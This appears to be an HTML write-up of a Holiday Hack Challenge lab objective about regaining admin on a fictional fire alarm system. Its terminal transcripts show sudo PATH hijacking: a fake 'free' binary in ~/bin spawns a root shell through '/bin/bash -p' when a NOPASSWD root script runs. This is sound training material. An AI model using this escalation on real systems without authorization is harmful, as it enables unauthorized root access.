@@ -1,0 +1,372 @@
+<div class="kc-section" style="margin-bottom: 0;">
+  <h1 class="kc-section-title">Neighborhood Watch Bypass</h1>
+
+  <!-- Difficulty + Location -->
+  <div class="kc-objective-meta kc-objective-meta--stacked">
+    <div class="kc-meta-line kc-difficulty">
+      <span class="kc-meta-label">Difficulty:</span>
+      <span class="kc-difficulty-scale"
+            aria-label="Difficulty 1 out of 5 snowflakes">
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+      </span>
+    </div>
+
+    <div class="kc-meta-line kc-location">
+      <span class="kc-meta-label">Location:</span>
+      <span class="kc-meta-value">The Neighborhood (Outside the Data Center) </span>
+    </div>
+  </div>
+
+  <!-- Objective line -->
+  <p class="kc-objective-summary kc-meta-line">
+    <span class="kc-meta-label">Objective:</span>
+    <span class="kc-meta-value">
+      Assist Kyle at the old data center with a fire alarm that just won't chill.
+    </span> 
+  </p>
+
+    <!-- Conversation banner -->
+  <div class="kc-convo-header">
+    <span class="kc-convo-icon">
+      <i class="fas fa-comment-dots" aria-hidden="true"></i>
+    </span>
+    <span class="kc-convo-title">Kyle Parrish Conversation:</span>
+  </div>
+
+  <div class="kc-objective-detail kc-objective-detail--no-panel">
+    <div class="kc-convo-bubble">
+      <div class="kc-convo-avatar">
+        <img src="kyleparrish-avatar.gif"
+             alt="Kyle Parrish avatar">
+        <div class="kc-convo-name">Kyle Parrish</div>
+      </div>
+
+      <div class="kc-convo-text">
+        <p>
+          If you spot a fire, let me know! I&apos;m Kyle, and I&apos;ve been around the Holiday Hack
+          Challenge scene for years as arnydo &ndash; picked up multiple Super Honorable Mentions
+          along the way.
+        </p>
+        <p>
+          When I&apos;m not fighting fires or hunting vulnerabilities, you&apos;ll find me on a
+          unicycle or juggling &ndash; I once showed up a professional clown with his own clubs!
+        </p>
+        <p>
+          My family and I love exploring those East Tennessee mountains, and honestly, geocaching
+          teaches you a lot about finding hidden things &ndash; useful in both firefighting and hacking.
+        </p>
+        <p>
+          Anyway, I could use some help here. This fire alarm keeps going nuts but there&apos;s no fire.
+          I checked.
+        </p>
+        <p>
+          I think someone has locked us out of the system. Can you see if you can get back in?
+        </p>
+
+        <div class="kc-convo-actions">
+          <button class="kc-convo-play-btn" type="button"
+                  data-npc-audio="neighborhood-watch-intro">
+            <i class="fas fa-play" aria-hidden="true"></i>
+            <span>Play Audio</span>
+          </button>
+        </div>
+      </div> <!-- /.kc-convo-text -->
+    </div>   <!-- /.kc-convo-bubble -->
+  </div>     <!-- /.kc-objective-detail -->
+
+  <!-- Hints header -->
+<div class="kc-convo-header kc-hints-header">
+  <span class="kc-convo-icon kc-hints-icon">
+    <i class="fas fa-lightbulb" aria-hidden="true"></i>
+  </span>
+  <span class="kc-convo-title">Hints:</span>
+</div>
+
+<!-- Hint 1 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">What Are My Powers?</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Neighborhood Watch Bypass</div>
+  <p>
+    You know, <code>sudo</code> is a REALLY powerful tool. It allows you to run executables as
+    <strong>root</strong>! There is even a handy switch that will tell you what powers your user has.
+  </p>
+</div>
+
+<!-- Hint 2 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Path Hijacking</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Neighborhood Watch Bypass</div>
+  <p>
+    Be careful when writing scripts that allow regular users to run them. One thing to be wary of
+    is not using full paths to executables...these can be hijacked.
+  </p>
+</div>
+
+<!-- NEW purple banner goes *after* the bubble -->
+<div class="kc-workflow-header">
+  <span class="kc-workflow-icon">
+    <i class="fas fa-tasks" aria-hidden="true"></i>
+  </span>
+  <span class="kc-workflow-title">Working through the Challenge:</span>
+</div>
+
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <div class="kc-workflow-row">
+    <div class="kc-workflow-text">
+      <p class="kc-workflow-intro">
+        We need to find the fire alarm control panel, head to the west side of the data center building.
+      </p>
+      <p class="kc-workflow-intro">
+        You might need to use the Q and E keys to rotate the view to see around the building.
+      </p>
+    </div>
+
+    <div class="kc-workflow-illustration">
+      <img src="fire_alarm_panel.png"
+          alt="Fire alarm control panel"
+          class="kc-workflow-image">
+    </div>
+  </div>
+</div>
+
+<div class="kc-terminal-header">
+  <span class="kc-terminal-icon">
+    <img src="cranpi.png" alt="Cranberry Pi terminal icon">
+  </span>
+  <span class="kc-terminal-title">Cranberry Pi Terminal</span>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--fire">
+  <pre class="kc-terminal-text">🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥
+              DOSIS NEIGHBORHOOD FIRE ALARM SYSTEM - LOCKOUT MODE
+🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥
+
+<span class="term-red">🚨 EMERGENCY ALERT:</span> Fire alarm system admin access has been compromised! 🚨
+The fire safety systems are experiencing interference and
+admin privileges have been mysteriously revoked. The neighborhood&apos;s fire
+protection infrastructure is at risk!
+
+<span class="term-yellow">⚠️ CURRENT STATUS:</span> Limited to standard user access only
+<span class="term-yellow">🔒 FIRE SAFETY SYSTEMS:</span> Partially operational but restricted
+<span class="term-yellow">🎯 MISSION CRITICAL:</span> Restore full fire alarm system control
+
+Your mission: Find a way to bypass the current restrictions and elevate to
+fire safety admin privileges. Once you regain full access, run the special
+command <span class="term-command">/etc/firealarm/restore_fire_alarm</span> to restore complete fire alarm system control and
+protect the Dosis neighborhood from potential emergencies.
+
+🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥
+
+<span class="term-hostline">🏠 <span class="term-user">chiuser</span> @ <span class="term-hostname">Dosis Neighborhood</span> ~ 🔍 $</span>
+  </pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Using <code><strong>sudo -l</strong></code> lets investigate if our user is permitted
+    to run any commands as root.
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-hostline">🏠 <span class="term-user">chiuser</span> @ <span class="term-hostname">Dosis Neighborhood</span> ~ 🔍 $</span> <strong>sudo -l</strong>
+Matching Defaults entries for chiuser on 5d1ca399c12b:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
+    secure_path=/home/chiuser/bin\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+="API_ENDPOINT API_PORT RESOURCE_ID HHCUSERNAME", env_keep+=PATH
+
+User chiuser may run the following commands on 5d1ca399c12b:
+    (root) NOPASSWD: /usr/local/bin/system_status.sh
+
+<span class="term-hostline">🏠 <span class="term-user">chiuser</span> @ <span class="term-hostname">Dosis Neighborhood</span> ~ 🔍 $</span>
+  </pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    The output shows that our user <code>chiuser</code> can run the script
+    <code>/usr/local/bin/system_status.sh</code> as root without a password.
+    Let&apos;s take a look at that script to see what it does.
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-hostline">🏠 <span class="term-user">chiuser</span> @ <span class="term-hostname">Dosis Neighborhood</span> ~ 🔍 $</span> <strong>cat /usr/local/bin/system_status.sh</strong>
+#!/bin/bash
+echo "=== Dosis Neighborhood Fire Alarm System Status ==="
+echo "Fire alarm system monitoring active..."
+echo ""
+echo "System resources (for alarm monitoring):"
+free -h
+echo -e "\nDisk usage (alarm logs and recordings):"
+df -h
+echo -e "\nActive fire department connections:"
+w
+echo -e "\nFire alarm monitoring processes:"
+ps aux | grep -E "(alarm|fire|monitor|safety)" | head -5 || echo "No active fire monitoring processes detected"
+echo ""
+echo "🔥 Fire Safety Status: All systems operational"
+echo "🚨 Emergency Response: Ready"
+echo "📍 Coverage Area: Dosis Neighborhood (all sectors)"
+<span class="term-hostline">🏠 <span class="term-user">chiuser</span> @ <span class="term-hostname">Dosis Neighborhood</span> ~ 🔍 $</span>
+  </pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    The script runs several system commands like <code>free</code>, <code>df</code>,
+    <code>w</code>, and <code>ps</code> to display system information. Since these
+    commands are called without full paths, we can exploit this by creating our
+    own malicious versions of these commands in a directory we control.
+  </p>
+  <p>
+    First, we confirm which <code>free</code> binary is currently being used and
+    then inspect our <code>PATH</code> to see if we can influence command
+    resolution by placing our own binaries earlier in the search order.
+  </p>
+</div>
+
+<!-- Which free + PATH -->
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-hostline">🏠 <span class="term-user">chiuser</span> @ <span class="term-hostname">Dosis Neighborhood</span> ~ 🔍 $</span> which free
+/usr/bin/free
+
+<span class="term-hostline">🏠 <span class="term-user">chiuser</span> @ <span class="term-hostname">Dosis Neighborhood</span> ~ 🔍 $</span> echo $PATH
+/home/chiuser/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+  </pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    The key detail here is that <code>/home/chiuser/bin</code> appears
+    <strong>first</strong> in <code>PATH</code>. That means if we place an executable
+    named <code>free</code> in <code>~/bin</code>, it will be found before the real
+    <code>/usr/bin/free</code> when the script calls <code>free</code> without a full
+    path.
+  </p>
+  <p>
+    We can abuse this by creating a malicious <code>free</code> that simply spawns
+    a root shell when the script is run with <code>sudo</code>.
+  </p>
+</div>
+
+<!-- Creating the evil free -->
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-hostline">🏠 <span class="term-user">chiuser</span> @ <span class="term-hostname">Dosis Neighborhood</span> ~ 🔍 $</span> cat > ~/bin/free <<'EOF'
+#!/bin/bash
+# spawn a privileged interactive shell and keep pty privileges
+/bin/bash -p
+EOF
+
+<span class="term-hostline">🏠 <span class="term-user">chiuser</span> @ <span class="term-hostname">Dosis Neighborhood</span> ~ 🔍 $</span> chmod +x ~/bin/free
+  </pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Now <code>~/bin/free</code> is an executable under our control. Because
+    <code>/home/chiuser/bin</code> is at the front of <code>PATH</code>, when the
+    root-owned script invokes <code>free</code>, it will actually execute our
+    malicious version and drop us into a root shell via <code>/bin/bash -p</code>.
+  </p>
+</div>
+
+<!-- Running the status script as root -->
+<div class="kc-terminal-window">
+  <pre class="kc-terminal-text"><span class="term-hostline">🏠 <span class="term-user">chiuser</span> @ <span class="term-hostname">Dosis Neighborhood</span> ~ 🔍 $</span> sudo /usr/local/bin/system_status.sh
+=== Dosis Neighborhood Fire Alarm System Status ===
+Fire alarm system monitoring active...
+
+System resources (for alarm monitoring):
+root@5d1ca399c12b:/home/chiuser# 
+  </pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Instead of showing normal memory usage output, the <code>free</code> call
+    triggered our malicious wrapper and we popped a root shell:
+    <code>root@5d1ca399c12b:/home/chiuser#</code>. With full administrative
+    access restored, we can now run the special fire alarm restoration command <code>/etc/firealarm/restore_fire_alarm</code>.
+  </p>
+</div>
+
+<!-- Running the restoration command as root -->
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text">root@5d1ca399c12b:/home/chiuser# /etc/firealarm/restore_fire_alarm
+🔥🚨 FIRE ALARM SYSTEM: Attempting to restore admin privileges...
+🔒 BYPASSING SECURITY RESTRICTIONS...
+📡 Connecting to fire safety control center: https://2025.holidayhackchallenge.com:443/turnstile?rid=4938ba2c-8212-494e-9cd8-690ec0c2ce73
+🎯 SUCCESS! Fire alarm system admin access RESTORED!
+🚨 DOSIS NEIGHBORHOOD FIRE PROTECTION: FULLY OPERATIONAL
+✅ All fire safety systems are now under proper administrative control
+🔥 Emergency response capabilities: ACTIVE
+🏠 Neighborhood fire protection: SECURED
+
+======================================================================
+   CONGRATULATIONS! You've successfully restored fire alarm system
+   administrative control and protected the Dosis neighborhood!
+======================================================================
+
+🔥🚨 FIRE ALARM SYSTEM RESTORATION COMPLETE 🚨🔥
+root@5d1ca399c12b:/home/chiuser# 
+  </pre>
+</div>
+
+<div class="kc-solution-header">
+  <span class="kc-solution-icon">
+    <i class="fas fa-check-circle" aria-hidden="true"></i>
+  </span>
+  <span class="kc-solution-title"><strong>SOLUTION: Run <code>/etc/firealarm/restore_fire_alarm</code> after escalating privileges</strong></span>
+</div>
+
+<!-- Solution dialogue banner -->
+<div class="kc-convo-header kc-solution-dialog-header">
+  <span class="kc-convo-icon">
+    <i class="fas fa-comment-dots" aria-hidden="true"></i>
+  </span>
+  <span class="kc-convo-title">Solution dialogue:</span>
+</div>
+
+<div class="kc-objective-detail kc-objective-detail--no-panel">
+  <div class="kc-convo-bubble">
+    <div class="kc-convo-avatar">
+      <img src="kyleparrish-portrait.png"
+           alt="Kyle Parrish portrait">
+      <div class="kc-convo-name">Kyle Parrish</div>
+    </div>
+
+    <div class="kc-convo-text">
+      <p>
+        Wow! Thank you so much! I didn&apos;t realize <code>sudo</code> was so powerful.
+        Especially when misconfigured. Who knew a simple privilege escalation could
+        unlock the whole fire safety system?
+      </p>
+      <p>
+        Now... will you <code>sudo</code> make me a sandwich?
+      </p>
+
+      <div class="kc-convo-actions">
+        <button class="kc-convo-play-btn kc-convo-play-btn-complete" type="button">
+          <i class="fas fa-play" aria-hidden="true"></i>
+          <span>Play Audio</span>
+        </button>
+      </div>
+    </div>
+  </div>
+</div>
+</div>       <!-- /.kc-section -->
+
